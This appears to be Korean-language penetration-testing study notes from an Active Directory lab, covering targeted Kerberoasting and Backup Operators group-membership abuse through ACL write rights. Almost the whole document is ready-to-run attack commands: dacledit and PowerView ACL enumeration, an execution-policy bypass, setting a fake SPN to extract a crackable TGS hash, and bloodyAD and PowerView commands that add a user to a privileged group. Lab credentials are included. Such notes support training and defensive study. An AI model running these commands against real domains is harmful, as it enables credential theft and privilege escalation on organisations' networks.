## Targeted Kerberoasting
- 쓰기 권한을 악용해 원래 SPN이 없던 계정에 SPN을 강제로 부여한 뒤, TGS 티켓을 요청해 해시를 탈취하고 오프라인으로 크래킹하는 기법.
- GenericAll, GenericWrite, WriteProperty, WriteSPN, Validated-SPN

### Enumerating
```bash
python3 examples/dacledit.py -principal pedro -target Rita -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity rita | ?{$_.SecurityIdentifier -eq $userSID}
```

### Abusing
- SPN을 생성한 후에 TGS를 요청하게 되는 코드가 있다.
```bash
python3 targetedKerberoast.py -vv -d inlanefreight.local -u pedro -p SecuringAD01 --request-user rita --dc-ip 10.129.205.81
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

Set-DomainObject -Identity rita -Set @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose

$User = Get-DomainUser Rita

$User | Get-DomainSPNTicket | Select-Object -ExpandProperty Hash

Set-DomainObject -Identity Rita -Clear serviceprincipalname -Verbose
```

## Add Members
- GenericAll, GenericWrite, Self, AllExtendedRights, Self-Membership

### Enumerating
```bash
python3 examples/dacledit.py -principal pedro -target 'Backup Operators' -dc-ip 10.129.205.81 inlanefreight.local/pedro:SecuringAD01
```
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

Import-Module .\PowerView.ps1

$userSID = (Get-DomainUser -Identity pedro).objectsid

Get-DomainObjectAcl -Identity 'Backup Operators' -ResolveGUIDs | ?{$_.SecurityIdentifier -eq $userSID}
```

### Abusing
```bash
bloodyAD -d inlanefreight.local -u pedro -p SecuringAD01 --dc-ip 10.129.205.81 add groupMember 'Backup Operators' pedro

net rpc group members 'Backup Operators' -U inlanefreight.local/pedro%SecuringAD01 -S 10.129.205.81
```
```powershell
Import-module .\powerview.ps1

Add-DomainGroupMember -Identity "Backup Operators" -Members pedro -Verbose
```
